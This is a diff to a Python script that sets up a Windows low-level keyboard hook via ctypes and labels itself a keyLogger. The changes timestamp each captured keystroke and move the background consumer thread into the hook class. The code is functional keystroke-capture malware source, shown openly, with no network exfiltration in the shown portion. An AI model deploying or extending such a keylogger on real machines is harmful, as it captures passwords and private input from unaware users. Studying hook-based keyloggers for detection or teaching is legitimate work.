@@ -1,6 +1,7 @@
 #!/usr/local/bin/python3
 # -*- coding: utf-8 -*-
 import sys
+import time
 import ctypes
 from ctypes.wintypes import MSG
 from multiprocessing import Queue
@@ -27,9 +28,19 @@ KEY_MAP = {
 
 
 class KeyboardHook:
-    def __init__(self, queue=None):
+    def __init__(self, digest_fn=None):
         self.hooked = None
-        self.queue = queue or Queue()
+        self.queue = Queue()
+
+        self.thread = None
+        if digest_fn and callable(digest_fn):
+            self.thread = Thread(target=digest_queue, args=(self.queue,), daemon=True)  # noqa: E501
+            self.thread.start()
+
+    def __del__(self):
+        print('KeyboardHook.__del__')
+        if self.thread:
+            self.thread.join()
 
     def install_hook_procedure(self, pointer):
         module_handle = ctypes.windll.kernel32.GetModuleHandleW(None)
@@ -71,7 +82,7 @@ class KeyboardHook:
                                                        nCode,
                                                        wParam,
                                                        lParam)
-        self.queue.put(hooked_key)
+        self.queue.put((int(time.time() * 1000), hooked_key))
         return ctypes.windll.user32.CallNextHookEx(self.hooked,
                                                    nCode,
                                                    wParam,
@@ -85,14 +96,8 @@ def digest_queue(queue):
 
 
 if __name__ == "__main__":
-    queue = Queue()
-    thread = Thread(target=digest_queue, args=(queue,), daemon=True)
-    thread.start()
-
-    key_hook = KeyboardHook(queue)
+    key_hook = KeyboardHook(digest_fn=digest_queue)
     pointer = get_function_pointer(key_hook.hook_procedure)
     if key_hook.install_hook_procedure(pointer):
         print("installed keyLogger")
     key_hook.run()
-
-    thread.join()
